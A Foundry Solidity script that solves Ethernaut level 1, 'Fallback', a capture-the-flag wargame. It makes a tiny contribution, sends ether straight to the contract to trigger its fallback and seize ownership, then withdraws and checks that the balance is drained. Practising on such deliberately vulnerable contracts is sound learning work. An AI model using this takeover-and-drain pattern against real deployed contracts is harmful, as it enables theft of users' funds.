pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface Fallback {
    function owner() external view returns (address);

    function contribute() external payable;

    function getContribution() external view returns (uint256);

    function withdraw() external;
}

contract Ethernaut01 is Test {
    Fallback constant instance =
        Fallback(address(0x38eF5E9B9D7944808F8048343E38E49B476Df400));

    function run() public {
        vm.startBroadcast();
        instance.contribute{value: 1}();
        address(instance).call{value: 1}("");
        instance.withdraw();
        vm.stopBroadcast();

        require(address(instance).balance == 0);
    }
}
